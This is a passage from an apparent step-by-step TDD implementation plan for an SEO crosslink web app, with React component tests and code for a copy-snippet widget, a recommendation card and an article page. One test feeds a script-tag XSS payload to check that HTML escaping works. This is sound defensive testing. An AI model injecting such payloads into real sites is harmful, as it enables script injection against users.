 * @param options.analysisRunId - Used in the filename (falls back to "all")
 * @returns NextResponse with JSON body and appropriate headers
 */
export function createJsonExportResponse(
  data: unknown,
  options: {
    download?: boolean;
    analysisRunId?: string;
  } = {}
): NextResponse {
  const { download = false, analysisRunId } = options;

  const headers = new Headers({
    "Content-Type": "application/json; charset=utf-8",
  });

  if (download) {
    const date = new Date().toISOString().slice(0, 10);
    const runPart = analysisRunId ?? "all";
    headers.set(
      "Content-Disposition",
      `attachment; filename="seo-ilator-recommendations-${runPart}-${date}.json"`
    );
  }

  return NextResponse.json(data, { headers });
}
```

**Verify:**

```bash
npx tsc --noEmit src/lib/export/json.ts 2>&1 | head -5
# Expected: no errors
```

### Step 6.2c.2 — Commit the JSON serializer

- [ ] Commit the implementation

```bash
git add src/lib/export/json.ts
git commit -m "feat(export): add JSON serializer with Content-Disposition for downloads

createJsonExportResponse() wraps NextResponse.json() with download-mode
Content-Disposition header. Generates timestamped filename with run ID.
Per DECISION-003 JSON export specification."
```

**Expected:** Clean commit. Export TDD Agent work is complete.

---

## UI Agent: Task 6.5 — CopySnippet Component (RED/GREEN)

> **Branch:** `feature/phase-6-ui`
> **Depends on:** None (self-contained component)
> **No file overlap with API Agent or Export TDD Agent** — UI Agent owns `src/components/` and `tests/components/`.

### Step 6.5.1 — Create the branch

- [ ] Create and switch to `feature/phase-6-ui` from `develop`

```bash
cd /Users/justin/CascadeProjects/SEO-ilator
git checkout develop
git checkout -b feature/phase-6-ui
```

**Expected:** Branch created. `git branch --show-current` outputs `feature/phase-6-ui`.

### Step 6.5.2 — Create test and component directories

- [ ] Create the directory structure

```bash
mkdir -p tests/components/recommendations
mkdir -p tests/components/data
mkdir -p src/components/recommendations
mkdir -p src/components/data
```

**Expected:** All directories exist.

### Step 6.5.3 — RED: Write 6 failing CopySnippet tests

- [ ] Create `tests/components/recommendations/CopySnippet.test.tsx` with all 6 test cases

**File:** `tests/components/recommendations/CopySnippet.test.tsx`

```tsx
import { describe, it, expect, vi, beforeEach, afterEach } from "vitest";
import { render, screen, fireEvent, waitFor } from "@testing-library/react";
import userEvent from "@testing-library/user-event";
import { CopySnippet } from "@/components/recommendations/CopySnippet";

/**
 * CopySnippet component tests.
 *
 * CopySnippet renders an editable anchor text field and a generated HTML preview.
 * The generated HTML is: <a href="[targetUrl]">[anchorText]</a>
 *
 * Security requirements [AAP-F3]:
 * - HTML-escape both anchorText and targetUrl (<, >, ", &, ')
 * - Clipboard fallback via document.execCommand('copy') for non-HTTPS contexts
 *
 * Test environment: jsdom with mocked navigator.clipboard and document.execCommand.
 */

// ── Mocks ──

const mockWriteText = vi.fn().mockResolvedValue(undefined);
const mockExecCommand = vi.fn().mockReturnValue(true);

beforeEach(() => {
  // Mock clipboard API
  Object.assign(navigator, {
    clipboard: {
      writeText: mockWriteText,
    },
  });
  // Mock execCommand fallback
  document.execCommand = mockExecCommand;
});

afterEach(() => {
  vi.restoreAllMocks();
  mockWriteText.mockClear();
  mockExecCommand.mockClear();
});

// ── Tests ──

describe("CopySnippet", () => {
  it("generates_correct_html_from_anchor_and_url", () => {
    render(
      <CopySnippet
        anchorText="internal linking"
        targetUrl="https://example.com/guide"
      />
    );

    // The generated HTML preview should show the correct <a> tag
    const preview = screen.getByTestId("snippet-preview");
    expect(preview.textContent).toContain(
      '<a href="https://example.com/guide">internal linking</a>'
    );
  });

  it("updates_html_when_anchor_text_edited", async () => {
    const user = userEvent.setup();

    render(
      <CopySnippet
        anchorText="original text"
        targetUrl="https://example.com/target"
      />
    );

    // Find the editable anchor text input and change it
    const input = screen.getByRole("textbox", { name: /anchor text/i });
    await user.clear(input);
    await user.type(input, "new anchor text");

    // The preview should update to reflect the new anchor text
    const preview = screen.getByTestId("snippet-preview");
    expect(preview.textContent).toContain(
      '<a href="https://example.com/target">new anchor text</a>'
    );
  });

  it("escapes_special_characters_in_anchor_text", () => {
    // [AAP-F3] Anchor text with HTML special characters must be escaped
    // to prevent XSS when the snippet is pasted into a CMS
    render(
      <CopySnippet
        anchorText={'<script>alert("xss")</script>'}
        targetUrl="https://example.com/safe"
      />
    );

    const preview = screen.getByTestId("snippet-preview");
    const html = preview.textContent ?? "";

    // The <script> tag should be escaped, not rendered as HTML
    expect(html).toContain("&lt;script&gt;alert(&quot;xss&quot;)&lt;/script&gt;");
    expect(html).not.toContain("<script>");
  });

  it("escapes_special_characters_in_target_url", () => {
    // [AAP-F3] URL with special characters must be escaped in the href attribute
    render(
      <CopySnippet
        anchorText="safe text"
        targetUrl='https://example.com/page?a=1&b="quoted"'
      />
    );

    const preview = screen.getByTestId("snippet-preview");
    const html = preview.textContent ?? "";

    // Ampersand and quotes in the URL should be escaped
    expect(html).toContain("&amp;");
    expect(html).toContain("&quot;");
    expect(html).not.toContain('b="quoted"');
  });

  it("falls_back_to_execCommand_when_clipboard_api_unavailable", async () => {
    // [AAP-F3] When navigator.clipboard is unavailable (non-HTTPS contexts),
    // fall back to document.execCommand('copy')
    const user = userEvent.setup();

    // Remove clipboard API to simulate non-HTTPS context
    Object.assign(navigator, { clipboard: undefined });

    render(
      <CopySnippet
        anchorText="fallback test"
        targetUrl="https://example.com/fallback"
      />
    );

    const copyButton = screen.getByRole("button", { name: /copy html/i });
    await user.click(copyButton);

    // Should have used execCommand as fallback
    await waitFor(() => {
      expect(mockExecCommand).toHaveBeenCalledWith("copy");
    });
    expect(mockWriteText).not.toHaveBeenCalled();
  });

  it("calls_clipboard_api_on_copy", async () => {
    const user = userEvent.setup();

    render(
      <CopySnippet
        anchorText="copy me"
        targetUrl="https://example.com/target"
      />
    );

    const copyButton = screen.getByRole("button", { name: /copy html/i });
    await user.click(copyButton);

    await waitFor(() => {
      expect(mockWriteText).toHaveBeenCalledWith(
        '<a href="https://example.com/target">copy me</a>'
      );
    });
  });
});
```

**Verify RED:**

```bash
npx vitest tests/components/recommendations/CopySnippet.test.tsx --run 2>&1 | tail -10
# Expected: 6 failing tests (import error — CopySnippet doesn't exist yet)
```

### Step 6.5.4 — Commit failing CopySnippet tests

- [ ] Commit the RED test file

```bash
git add tests/components/recommendations/CopySnippet.test.tsx
git commit -m "test(ui): RED — add 6 failing CopySnippet component tests

Tests for HTML generation, anchor text editing, special character escaping
in anchor text [AAP-F3], URL escaping [AAP-F3], clipboard API fallback
[AAP-F3], and clipboard writeText on copy. TDD red phase."
```

**Expected:** Clean commit with failing tests.

### Step 6.5.5 — GREEN: Write the CopySnippet implementation

- [ ] Create `src/components/recommendations/CopySnippet.tsx`

**File:** `src/components/recommendations/CopySnippet.tsx`

```tsx
"use client";

import { useState, useCallback } from "react";

/**
 * CopySnippet component for recommendation crosslink implementation.
 *
 * Renders an editable anchor text field and a generated HTML snippet preview.
 * The snippet is: <a href="[targetUrl]">[anchorText]</a>
 *
 * Security [AAP-F3]:
 * - HTML-escapes both anchorText and targetUrl to prevent XSS when pasted into CMSes
 * - Escapes: < > " & '
 *
 * Clipboard [AAP-F3]:
 * - Uses navigator.clipboard.writeText() when available (HTTPS contexts)
 * - Falls back to document.execCommand('copy') for non-HTTPS contexts
 *
 * Source context highlighting [AAP-F10]:
 * - Uses simple string operations (indexOf + slice), NOT cheerio
 */

interface CopySnippetProps {
  /** Initial anchor text for the link */
  anchorText: string;
  /** Target URL for the link */
  targetUrl: string;
  /** Optional: source context paragraph containing the anchor text */
  sourceContext?: string;
  /** Optional: callback when copy succeeds (for toast notification) */
  onCopy?: () => void;
}

/**
 * HTML-escape a string to prevent XSS.
 * Escapes: < > " & '
 *
 * This is critical because users paste the generated HTML into CMSes
 * that may render it without additional sanitization.
 */
function escapeHtml(text: string): string {
  return text
    .replace(/&/g, "&amp;")
    .replace(/</g, "&lt;")
    .replace(/>/g, "&gt;")
    .replace(/"/g, "&quot;")
    .replace(/'/g, "&#39;");
}

/**
 * Generate the HTML snippet string with escaped values.
 */
function generateSnippet(anchorText: string, targetUrl: string): string {
  return `<a href="${escapeHtml(targetUrl)}">${escapeHtml(anchorText)}</a>`;
}

/**
 * Copy text to clipboard with fallback for non-HTTPS contexts.
 *
 * [AAP-F3] navigator.clipboard.writeText() requires a secure context (HTTPS).
 * In development or non-HTTPS environments, we fall back to the deprecated
 * document.execCommand('copy') which works in all contexts.
 */
async function copyToClipboard(text: string): Promise<void> {
  if (navigator.clipboard?.writeText) {
    await navigator.clipboard.writeText(text);
    return;
  }

  // Fallback: create a temporary textarea, select its contents, and copy
  const textarea = document.createElement("textarea");
  textarea.value = text;
  textarea.style.position = "fixed";
  textarea.style.left = "-9999px";
  textarea.style.top = "-9999px";
  document.body.appendChild(textarea);
  textarea.select();
  document.execCommand("copy");
  document.body.removeChild(textarea);
}

export function CopySnippet({
  anchorText: initialAnchorText,
  targetUrl,
  sourceContext,
  onCopy,
}: CopySnippetProps) {
  const [anchorText, setAnchorText] = useState(initialAnchorText);
  const [copied, setCopied] = useState(false);

  const snippet = generateSnippet(anchorText, targetUrl);

  const handleCopy = useCallback(async () => {
    try {
      await copyToClipboard(snippet);
      setCopied(true);
      onCopy?.();
      setTimeout(() => setCopied(false), 2000);
    } catch (error) {
      console.error("Failed to copy to clipboard:", error);
    }
  }, [snippet, onCopy]);

  // [AAP-F10] Source context highlighting using simple string operations
  const highlightedContext = sourceContext
    ? highlightAnchorInContext(sourceContext, anchorText)
    : null;

  return (
    <div className="rounded-lg border border-gray-200 bg-gray-50 p-4">
      {/* Editable anchor text */}
      <div className="mb-3">
        <label
          htmlFor="anchor-text-input"
          className="mb-1 block text-sm font-medium text-gray-700"
        >
          Anchor text
        </label>
        <input
          id="anchor-text-input"
          type="text"
          role="textbox"
          aria-label="Anchor text"
          value={anchorText}
          onChange={(e) => setAnchorText(e.target.value)}
          className="w-full rounded border border-gray-300 px-3 py-1.5 text-sm focus:border-blue-500 focus:outline-none focus:ring-1 focus:ring-blue-500"
        />
      </div>

      {/* Generated HTML preview */}
      <div className="mb-3">
        <span className="mb-1 block text-sm font-medium text-gray-700">
          Generated HTML
        </span>
        <code
          data-testid="snippet-preview"
          className="block rounded bg-white px-3 py-2 font-mono text-sm text-gray-800 border border-gray-200"
        >
          {snippet}
        </code>
      </div>

      {/*
        Source context with highlighted anchor text.
        SAFETY NOTE: highlightAnchorInContext() HTML-escapes ALL user input first
        via escapeHtml(), then inserts only a controlled <mark> tag around the
        matched text. The resulting HTML contains no unescaped user content.
      */}
      {highlightedContext && (
        <div className="mb-3">
          <span className="mb-1 block text-sm font-medium text-gray-700">
            Source context
          </span>
          <p
            className="rounded bg-white px-3 py-2 text-sm text-gray-600 border border-gray-200"
            dangerouslySetInnerHTML={{ __html: highlightedContext }}
          />
        </div>
      )}

      {/* Copy button */}
      <button
        type="button"
        onClick={handleCopy}
        aria-label="Copy HTML"
        className={`rounded px-4 py-1.5 text-sm font-medium transition-colors ${
          copied
            ? "bg-green-100 text-green-800"
            : "bg-blue-600 text-white hover:bg-blue-700"
        }`}
      >
        {copied ? "Copied!" : "Copy HTML"}
      </button>
    </div>
  );
}

/**
 * Highlight the anchor text within the source context paragraph.
 *
 * [AAP-F10] Uses simple string operations (indexOf + slice), NOT cheerio.
 * Returns an HTML string with the first occurrence of anchorText wrapped in <mark>.
 * If anchorText is not found, returns the original context.
 *
 * SAFETY: The context text is HTML-escaped FIRST to prevent XSS, then the <mark>
 * tag is inserted around the match. No unescaped user content appears in the output.
 */
function highlightAnchorInContext(context: string, anchorText: string): string {
  const escapedContext = escapeHtml(context);
  const escapedAnchor = escapeHtml(anchorText);

  const index = escapedContext.toLowerCase().indexOf(escapedAnchor.toLowerCase());
  if (index === -1) {
    return escapedContext;
  }

  const before = escapedContext.slice(0, index);
  const match = escapedContext.slice(index, index + escapedAnchor.length);
  const after = escapedContext.slice(index + escapedAnchor.length);

  return `${before}<mark class="bg-yellow-200 px-0.5 rounded">${match}</mark>${after}`;
}
```

**Verify GREEN:**

```bash
npx vitest tests/components/recommendations/CopySnippet.test.tsx --run 2>&1 | tail -10
# Expected: 6 passing tests
```

### Step 6.5.6 — Commit the CopySnippet implementation

- [ ] Commit the GREEN implementation

```bash
git add src/components/recommendations/CopySnippet.tsx
git commit -m "feat(ui): GREEN — add CopySnippet with HTML escaping and clipboard fallback

Editable anchor text field with live HTML preview. Escapes <, >, \", &, '
in both anchorText and targetUrl per AAP-F3. Clipboard API with
execCommand fallback for non-HTTPS per AAP-F3. Source context highlighting
uses string operations per AAP-F10. Passes all 6 CopySnippet tests."
```

**Expected:** Clean commit. All 6 CopySnippet tests pass.

---

## UI Agent: Task 6.4a — RecommendationCard Component (RED/GREEN)

> **Branch:** `feature/phase-6-ui` (continues from 6.5)
> **Depends on:** Task 6.5 (CopySnippet)

### Step 6.4a.1 — RED: Write 3 failing RecommendationCard tests

- [ ] Create `tests/components/data/RecommendationCard.test.tsx` with all 3 test cases

**File:** `tests/components/data/RecommendationCard.test.tsx`

```tsx
import { describe, it, expect, vi, beforeEach, afterEach } from "vitest";
import { render, screen, waitFor } from "@testing-library/react";
import userEvent from "@testing-library/user-event";
import { RecommendationCard } from "@/components/data/RecommendationCard";

/**
 * RecommendationCard component tests.
 *
 * RecommendationCard displays a single crosslink recommendation with:
 * - Severity badge (critical/warning/info)
 * - Anchor text, source/target article links
 * - Accept/Dismiss action buttons
 * - CopySnippet for HTML generation
 *
 * The component calls PATCH /api/recommendations/[id] on accept/dismiss.
 * [AAP-F2] On failure, the parent handles optimistic rollback.
 *
 * Test environment: jsdom with mocked fetch for API calls.
 */

// ── Mocks ──

const mockFetch = vi.fn();

beforeEach(() => {
  global.fetch = mockFetch;
  mockFetch.mockResolvedValue({
    ok: true,
    json: async () => ({ data: { id: "rec-1", status: "accepted" } }),
  });
});

afterEach(() => {
  vi.restoreAllMocks();
});

// ── Test fixtures ──

const defaultProps = {
  id: "rec-1",
  severity: "warning" as const,
  title: "Add crosslink to Internal Linking Guide",
  description: "The article mentions internal linking but doesn't link to your comprehensive guide.",
  anchorText: "internal linking",
  targetUrl: "https://example.com/internal-linking",
  targetTitle: "Internal Linking Guide",
  sourceUrl: "https://example.com/seo-tools",
  sourceTitle: "How to Build SEO Tools",
  sourceContext: "When building SEO tools, internal linking is one of the most important factors.",
  status: "pending" as const,
  confidence: 0.85,
  matchingApproach: "keyword" as const,
  updatedAt: "2026-03-23T10:00:00.000Z",
  onStatusChange: vi.fn(),
};

// ── Tests ──

describe("RecommendationCard", () => {
  it("renders_severity_badge_correctly", () => {
    // Test all three severity levels
    const { rerender } = render(<RecommendationCard {...defaultProps} severity="critical" />);
    expect(screen.getByTestId("severity-badge")).toHaveTextContent("critical");
    expect(screen.getByTestId("severity-badge")).toHaveClass("bg-red-100");

    rerender(<RecommendationCard {...defaultProps} severity="warning" />);
    expect(screen.getByTestId("severity-badge")).toHaveTextContent("warning");
    expect(screen.getByTestId("severity-badge")).toHaveClass("bg-yellow-100");

    rerender(<RecommendationCard {...defaultProps} severity="info" />);
    expect(screen.getByTestId("severity-badge")).toHaveTextContent("info");
    expect(screen.getByTestId("severity-badge")).toHaveClass("bg-blue-100");
  });

  it("calls_accept_api_on_accept_click", async () => {
    const user = userEvent.setup();
    const onStatusChange = vi.fn();

    render(
      <RecommendationCard {...defaultProps} onStatusChange={onStatusChange} />
    );

    const acceptButton = screen.getByRole("button", { name: /accept/i });
    await user.click(acceptButton);

    await waitFor(() => {
      expect(mockFetch).toHaveBeenCalledWith(
        "/api/recommendations/rec-1",
        expect.objectContaining({
          method: "PATCH",
          headers: expect.objectContaining({
            "Content-Type": "application/json",
          }),
          body: expect.stringContaining('"status":"accepted"'),
        })
      );
    });

    // Verify the onStatusChange callback was called
    await waitFor(() => {
      expect(onStatusChange).toHaveBeenCalledWith("rec-1", "accepted");
    });
  });

  it("calls_dismiss_api_on_dismiss_click", async () => {
    const user = userEvent.setup();
    const onStatusChange = vi.fn();

    render(
      <RecommendationCard {...defaultProps} onStatusChange={onStatusChange} />
    );

    const dismissButton = screen.getByRole("button", { name: /dismiss/i });
    await user.click(dismissButton);

    await waitFor(() => {
      expect(mockFetch).toHaveBeenCalledWith(
        "/api/recommendations/rec-1",
        expect.objectContaining({
          method: "PATCH",
          body: expect.stringContaining('"status":"dismissed"'),
        })
      );
    });

    await waitFor(() => {
      expect(onStatusChange).toHaveBeenCalledWith("rec-1", "dismissed");
    });
  });
});
```

**Verify RED:**

```bash
npx vitest tests/components/data/RecommendationCard.test.tsx --run 2>&1 | tail -10
# Expected: 3 failing tests (import error — RecommendationCard doesn't exist yet)
```

### Step 6.4a.2 — Commit failing RecommendationCard tests

- [ ] Commit the RED test file

```bash
git add tests/components/data/RecommendationCard.test.tsx
git commit -m "test(ui): RED — add 3 failing RecommendationCard tests

Tests for severity badge rendering (critical/warning/info), accept API call,
and dismiss API call. RecommendationCard implementation does not exist yet.
TDD red phase."
```

**Expected:** Clean commit with failing tests.

### Step 6.4a.3 — GREEN: Write the RecommendationCard implementation

- [ ] Create `src/components/data/RecommendationCard.tsx`

**File:** `src/components/data/RecommendationCard.tsx`

```tsx
"use client";

import { useState, useCallback } from "react";
import { CopySnippet } from "@/components/recommendations/CopySnippet";

/**
 * RecommendationCard displays a single crosslink recommendation.
 *
 * Features:
 * - Severity badge with color coding (critical=red, warning=yellow, info=blue)
 * - Source and target article links
 * - Anchor text and source context with highlighting
 * - Accept/Dismiss action buttons
 * - CopySnippet for HTML generation and clipboard copy
 * - Confidence score and matching approach indicator
 *
 * [AAP-F2] The parent component manages optimistic UI:
 * - onStatusChange is called immediately on click for optimistic update
 * - If the PATCH fails, the parent reverts local state and shows an error toast
 *
 * [AAP-B12] Sends updatedAt in the PATCH body for optimistic locking.
 */

type Severity = "critical" | "warning" | "info";
type Status = "pending" | "accepted" | "dismissed" | "superseded";
type MatchingApproach = "keyword" | "semantic" | "both";

interface RecommendationCardProps {
  id: string;
  severity: Severity;
  title: string;
  description: string;
  anchorText: string;
  targetUrl: string;
  targetTitle: string;
  sourceUrl: string;
  sourceTitle: string;
  sourceContext?: string;
  status: Status;
  confidence: number;
  matchingApproach: MatchingApproach;
  updatedAt: string;
  /** Called after the API request completes (or for optimistic update) */
  onStatusChange: (id: string, newStatus: "accepted" | "dismissed") => void;
  /** Whether this card is selected for a bulk operation */
  selected?: boolean;
  /** Whether to disable actions (e.g., during a pending bulk operation) */
  disabled?: boolean;
  /** Optional checkbox handler for bulk selection */
  onSelect?: (id: string, selected: boolean) => void;
}

const SEVERITY_STYLES: Record<Severity, string> = {
  critical: "bg-red-100 text-red-800",
  warning: "bg-yellow-100 text-yellow-800",
  info: "bg-blue-100 text-blue-800",
};

const APPROACH_LABELS: Record<MatchingApproach, string> = {
  keyword: "Keyword match",
  semantic: "Semantic match",
  both: "Keyword + Semantic",
};

export function RecommendationCard({
  id,
  severity,
  title,
  description,
  anchorText,
  targetUrl,
  targetTitle,
  sourceUrl,
  sourceTitle,
  sourceContext,
  status,
  confidence,
  matchingApproach,
  updatedAt,
  onStatusChange,
  selected = false,
  disabled = false,
  onSelect,
}: RecommendationCardProps) {
  const [isLoading, setIsLoading] = useState(false);

  const handleAction = useCallback(
    async (newStatus: "accepted" | "dismissed") => {
      if (isLoading || disabled) return;

      setIsLoading(true);

      try {
        const response = await fetch(`/api/recommendations/${id}`, {
          method: "PATCH",
          headers: { "Content-Type": "application/json" },
          body: JSON.stringify({
            status: newStatus,
            updatedAt,
          }),
        });

        if (!response.ok) {
          const errorData = await response.json().catch(() => null);
          throw new Error(errorData?.error ?? `HTTP ${response.status}`);
        }

        onStatusChange(id, newStatus);
      } catch (error) {
        console.error(`Failed to ${newStatus} recommendation:`, error);
        // [AAP-F2] Parent handles rollback via onStatusChange error handling
        throw error;
      } finally {
        setIsLoading(false);
      }
    },
    [id, updatedAt, isLoading, disabled, onStatusChange]
  );

  const isPending = status === "pending";

  return (
    <div
      className={`rounded-lg border p-4 transition-colors ${
        selected ? "border-blue-300 bg-blue-50" : "border-gray-200 bg-white"
      } ${disabled ? "opacity-60" : ""}`}
      data-testid={`recommendation-card-${id}`}
    >
      {/* Header: checkbox, severity badge, title */}
      <div className="mb-2 flex items-start gap-3">
        {onSelect && (
          <input
            type="checkbox"
            checked={selected}
            onChange={(e) => onSelect(id, e.target.checked)}
            disabled={disabled}
            className="mt-1"
            aria-label={`Select ${title}`}
          />
        )}

        <span
          data-testid="severity-badge"
          className={`inline-flex items-center rounded-full px-2.5 py-0.5 text-xs font-medium ${SEVERITY_STYLES[severity]}`}
        >
          {severity}
        </span>

        <div className="flex-1">
          <h3 className="text-sm font-semibold text-gray-900">{title}</h3>
          <p className="mt-0.5 text-sm text-gray-600">{description}</p>
        </div>

        {/* Confidence and approach */}
        <div className="text-right text-xs text-gray-500">
          <div>{Math.round(confidence * 100)}% confidence</div>
          <div>{APPROACH_LABELS[matchingApproach]}</div>
        </div>
      </div>

      {/* Source -> Target link */}
      <div className="mb-3 flex items-center gap-2 text-sm">
        <a href={sourceUrl} className="text-blue-600 hover:underline" target="_blank" rel="noopener noreferrer">
          {sourceTitle}
        </a>
        <span className="text-gray-400" aria-hidden="true">
          &rarr;
        </span>
        <a href={targetUrl} className="text-blue-600 hover:underline" target="_blank" rel="noopener noreferrer">
          {targetTitle}
        </a>
      </div>

      {/* CopySnippet */}
      <CopySnippet
        anchorText={anchorText}
        targetUrl={targetUrl}
        sourceContext={sourceContext}
      />

      {/* Actions */}
      {isPending && (
        <div className="mt-3 flex gap-2">
          <button
            type="button"
            onClick={() => handleAction("accepted")}
            disabled={isLoading || disabled}
            aria-label="Accept"
            className="rounded bg-green-600 px-3 py-1.5 text-sm font-medium text-white hover:bg-green-700 disabled:opacity-50"
          >
            {isLoading ? "..." : "Accept"}
          </button>
          <button
            type="button"
            onClick={() => handleAction("dismissed")}
            disabled={isLoading || disabled}
            aria-label="Dismiss"
            className="rounded bg-gray-200 px-3 py-1.5 text-sm font-medium text-gray-700 hover:bg-gray-300 disabled:opacity-50"
          >
            {isLoading ? "..." : "Dismiss"}
          </button>
        </div>
      )}

      {/* Status indicator for non-pending items */}
      {!isPending && (
        <div className="mt-3">
          <span
            className={`inline-flex items-center rounded-full px-2.5 py-0.5 text-xs font-medium ${
              status === "accepted"
                ? "bg-green-100 text-green-800"
                : status === "dismissed"
                  ? "bg-gray-100 text-gray-600"
                  : "bg-orange-100 text-orange-800"
            }`}
          >
            {status}
          </span>
        </div>
      )}
    </div>
  );
}
```

**Verify GREEN:**

```bash
npx vitest tests/components/data/RecommendationCard.test.tsx --run 2>&1 | tail -10
# Expected: 3 passing tests
```

### Step 6.4a.4 — Commit the RecommendationCard implementation

- [ ] Commit the GREEN implementation

```bash
git add src/components/data/RecommendationCard.tsx
git commit -m "feat(ui): GREEN — add RecommendationCard with severity badges and actions

Displays recommendation with severity badge (color-coded), source/target links,
CopySnippet, confidence score, and accept/dismiss buttons. Sends PATCH with
updatedAt for optimistic locking per AAP-B12. Parent handles rollback per
AAP-F2. Passes all 3 RecommendationCard tests."
```

**Expected:** Clean commit. All 3 RecommendationCard tests pass.

---

## UI Agent: Task 6.4b — Article Detail Page

> **Branch:** `feature/phase-6-ui` (continues from 6.4a)
> **Depends on:** Tasks 6.4a (RecommendationCard), 6.5 (CopySnippet)
> **Not TDD** — composition/layout page, not a testable unit.

### Step 6.4b.1 — Create the article detail directory

- [ ] Create the directory

```bash
mkdir -p src/app/dashboard/articles/\[id\]
```

**Expected:** Directory exists.

### Step 6.4b.2 — Write the article detail page

- [ ] Create `src/app/dashboard/articles/[id]/page.tsx`

**File:** `src/app/dashboard/articles/[id]/page.tsx`

```tsx
"use client";

import { useState, useEffect, useCallback } from "react";
import { useParams } from "next/navigation";
import { RecommendationCard } from "@/components/data/RecommendationCard";

/**
 * Article detail page with recommendations.
 *
 * Layout per Frontend plan Section 2.4:
 * - ArticleMeta (title, URL, word count, source type, dates)
 * - BodyPreview (collapsible, truncated)
 * - RecommendationsSection
 *   - RecommendationFilters (severity checkboxes, status tabs)
 *   - BulkActionBar (appears on selection)
 *   - RecommendationCard list with pagination
 *
 * [AAP-F2] Optimistic UI: accept/dismiss updates state immediately.
 * On PATCH failure, reverts local state and shows error toast.
 * Disables individual action buttons on items in pending bulk operation.
 *
 * [AAP-F5] Uses apiFetch wrapper for 401 detection.
 *
 * Empty state: "No recommendations yet. Run an analysis to generate crosslink suggestions."
 * Zero-results state: "No crosslink opportunities found for this run..."
 */

interface Article {
  id: string;
  title: string;
  url: string;
  wordCount: number;
  sourceType: string;
  createdAt: string;
  updatedAt: string;
  body?: string;
}

interface Recommendation {
  id: string;
  severity: "critical" | "warning" | "info";
  title: string;
  description: string;
  status: "pending" | "accepted" | "dismissed" | "superseded";
  confidence: number;
  matchingApproach: "keyword" | "semantic" | "both";
  updatedAt: string;
  suggestion?: {
    anchorText?: string;
    targetUrl?: string;
  };
  sourceArticle?: { id: string; title: string; url: string };
  targetArticle?: { id: string; title: string; url: string };
  sourceContext?: string;
}

type SeverityFilter = "critical" | "warning" | "info";
type StatusFilter = "all" | "pending" | "accepted" | "dismissed";

export default function ArticleDetailPage() {
  const params = useParams<{ id: string }>();
  const articleId = params.id;

  // Article data
  const [article, setArticle] = useState<Article | null>(null);
  const [articleLoading, setArticleLoading] = useState(true);

  // Recommendations data
  const [recommendations, setRecommendations] = useState<Recommendation[]>([]);
  const [recLoading, setRecLoading] = useState(true);
  const [totalRecs, setTotalRecs] = useState(0);
  const [page, setPage] = useState(1);
  const limit = 25;

  // Filters
  const [severityFilters, setSeverityFilters] = useState<Set<SeverityFilter>>(
    new Set(["critical", "warning", "info"])
  );
  const [statusFilter, setStatusFilter] = useState<StatusFilter>("all");

  // Bulk selection
  const [selectedIds, setSelectedIds] = useState<Set<string>>(new Set());
  const [bulkLoading, setBulkLoading] = useState(false);

  // Body preview
  const [bodyExpanded, setBodyExpanded] = useState(false);

  // Error toast
  const [error, setError] = useState<string | null>(null);

  // Fetch article
  useEffect(() => {
    async function fetchArticle() {
      setArticleLoading(true);
      try {
        const res = await fetch(`/api/articles/${articleId}`);
        if (res.status === 401) {
          window.location.href = `/auth/sign-in?callbackUrl=${encodeURIComponent(window.location.pathname)}`;
          return;
        }
        if (!res.ok) throw new Error("Failed to fetch article");
        const data = await res.json();
        setArticle(data.data);
      } catch (err) {
        setError(err instanceof Error ? err.message : "Failed to load article");
      } finally {
        setArticleLoading(false);
      }
    }
    fetchArticle();
  }, [articleId]);

  // Fetch recommendations
  const fetchRecommendations = useCallback(async () => {
    setRecLoading(true);
    try {
      const severityParam = Array.from(severityFilters).join(",");
      const statusParam = statusFilter === "all" ? "" : statusFilter;
      const queryParts = [
        `articleId=${articleId}`,
        `page=${page}`,
        `limit=${limit}`,
        severityParam ? `severity=${severityParam}` : "",
        statusParam ? `status=${statusParam}` : "",
      ].filter(Boolean);

      const res = await fetch(`/api/recommendations?${queryParts.join("&")}`);
      if (res.status === 401) {
        window.location.href = `/auth/sign-in?callbackUrl=${encodeURIComponent(window.location.pathname)}`;
        return;
      }
      if (!res.ok) throw new Error("Failed to fetch recommendations");
      const data = await res.json();
      setRecommendations(data.data);
      setTotalRecs(data.pagination.total);
    } catch (err) {
      setError(err instanceof Error ? err.message : "Failed to load recommendations");
    } finally {
      setRecLoading(false);
    }
  }, [articleId, page, severityFilters, statusFilter]);

  useEffect(() => {
    fetchRecommendations();
  }, [fetchRecommendations]);

  // [AAP-F2] Optimistic accept/dismiss with rollback
  const handleStatusChange = useCallback(
    async (recId: string, newStatus: "accepted" | "dismissed") => {
      // Save previous state for rollback
      const previousRecs = [...recommendations];

      // Optimistic update
      setRecommendations((prev) =>
        prev.map((rec) =>
          rec.id === recId ? { ...rec, status: newStatus } : rec
        )
      );

      try {
        const rec = recommendations.find((r) => r.id === recId);
        if (!rec) return;

        const res = await fetch(`/api/recommendations/${recId}`, {
          method: "PATCH",
          headers: { "Content-Type": "application/json" },
          body: JSON.stringify({ status: newStatus, updatedAt: rec.updatedAt }),
        });

        if (!res.ok) {
          throw new Error(
            res.status === 409
              ? "This recommendation was modified by another user. Refreshing..."
              : "Failed to update recommendation"
          );
        }
      } catch (err) {
        // Rollback on failure
        setRecommendations(previousRecs);
        setError(err instanceof Error ? err.message : "Update failed");
        if ((err as Error).message.includes("modified by another user")) {
          fetchRecommendations();
        }
      }
    },
    [recommendations, fetchRecommendations]
  );

  // Bulk actions
  const handleBulkAction = useCallback(
    async (newStatus: "accepted" | "dismissed") => {
      if (selectedIds.size === 0 || bulkLoading) return;

      setBulkLoading(true);
      const previousRecs = [...recommendations];
      const ids = Array.from(selectedIds);

      // Optimistic update
      setRecommendations((prev) =>
        prev.map((rec) =>
          selectedIds.has(rec.id) ? { ...rec, status: newStatus } : rec
        )
      );

      try {
        const res = await fetch("/api/recommendations/bulk", {
          method: "PATCH",
          headers: { "Content-Type": "application/json" },
          body: JSON.stringify({ ids, status: newStatus }),
        });

        if (!res.ok) throw new Error("Bulk update failed");

        const data = await res.json();
        if (data.updated !== data.requested) {
          setError(
            `Updated ${data.updated} of ${data.requested} recommendations. Some may have been modified or removed.`
          );
        }

        setSelectedIds(new Set());
      } catch (err) {
        setRecommendations(previousRecs);
        setError(err instanceof Error ? err.message : "Bulk update failed");
      } finally {
        setBulkLoading(false);
      }
    },
    [selectedIds, bulkLoading, recommendations]
  );

  const handleSelect = useCallback((id: string, selected: boolean) => {
    setSelectedIds((prev) => {
      const next = new Set(prev);
      if (selected) next.add(id);
      else next.delete(id);
      return next;
    });
  }, []);

  const toggleSeverity = useCallback((sev: SeverityFilter) => {
    setSeverityFilters((prev) => {
      const next = new Set(prev);
      if (next.has(sev)) next.delete(sev);
      else next.add(sev);
      return next;
    });
    setPage(1);
  }, []);

